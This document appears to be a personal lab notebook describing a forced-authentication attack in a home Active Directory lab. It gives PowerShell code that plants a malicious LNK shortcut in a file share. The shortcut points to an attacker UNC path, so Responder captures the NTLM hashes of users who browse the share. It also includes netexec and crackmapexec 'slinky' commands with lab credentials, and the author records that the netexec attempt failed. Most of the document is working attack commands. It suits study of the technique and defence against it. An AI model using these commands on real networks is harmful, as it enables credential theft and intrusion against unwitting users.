Attack idea:
1. We craft a malicious file and place it in a file share
2. We start *responder*
3. When the file is opened by a victim an authorization request is enforced and we can capture the hashes with *responder*

There is multiple ways of doing this.

Resources:
- https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf

---

# Malicious file creation with PowerShell

Create a malicious link (LNK):
```PowerShell
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\10.0.0.11\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

**$objShell.CreateShortcut("C:\\test.lnk")**:
This specifies the location and name of the created link.

**TargetPath**:
This is the path that is looked up (In this case a non-existing PNG file on our attacker machine) when the link gets resolved.

## Create the file in the fileshare "hackme"

We create the malicious link in the file share "hackme" on SPIDERMAN. Notice that we need an administrative powershell session for this:
```PowerShell
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("\\HYDRA-DC\hackme\test.lnk")
$lnk.TargetPath = "\\10.0.0.11\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

This indeed created the file:
![[Pasted image 20240321180407.png]]

## Collect hashes

On our attacker machine run *responder*:
```bash
sudo responder -I eth1 -dP
```
Make sure that SMB and HTTP is on in the config file **/etc/responder/Responder.conf**
![[Pasted image 20240321180835.png]]

If a user now opens the file share the link is automatically resolved and *responder* was able to collect his hash:
![[Pasted image 20240321181020.png]]


# Malicious file creation with Netexec

Alternatively to creating a file via Powershell we can use the tool *netexec*:
```bash
netexec smb 10.0.0.20 -d MARVEL.local -u frank -p Password1 -M slinky -o NAME=test_netexec SERVER=10.0.0.11
```
Args:
`10.0.0.20`: The IP address where the file share is located (remember we mounted the file share on SPIDERMAN)
`-M slinky`: The module *slinky* which we use for this attack
`-o NAME=test_netexec`: The link name (*test_netexec* in our case)
`SERVER=10.0.0.11`: The IP address which the link should be resolved to, in our case IP address of the attacker machine


==FAIL==

*netexec* has no module slinky for me!!!!

*Crackmapexec* has the module but the link creation does not work:
```bash
cme smb 10.0.0.20 -d MARVEL.local -u frank -p Password1 -M slinky -o NAME=test_netexec SERVER=10.0.0.11
```